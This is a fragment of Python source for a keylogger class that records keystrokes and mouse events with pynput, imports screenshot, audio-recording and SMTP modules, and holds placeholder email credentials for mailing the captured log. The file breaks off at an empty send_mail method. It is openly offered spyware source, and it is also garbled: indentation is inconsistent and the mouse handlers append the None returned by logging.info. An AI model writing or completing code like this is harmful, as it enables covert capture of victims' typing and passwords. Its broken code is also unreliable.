import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from pynput.keyboard import Listener
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import glob



emailAddress = "Input your E-mail username here..." # Your Email Address Goes Here
emailPassword = "Input your E-mail password here..." # Your Email Password Goes here

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "Keylogger Is Working..."
        self.email = email
        self.password = password

    def appendlog(self, string):
        self.log = self.log + string
    
     def on_move(self, x, y):
            current_move = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_move)

        def on_click(self, x, y):
            current_click = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_click)

        def on_scroll(self, x, y):
            current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_scroll)

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space: 
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "
            
            
            self.appendlog(current_key)

        def send_mail(self, email, password, message):
            
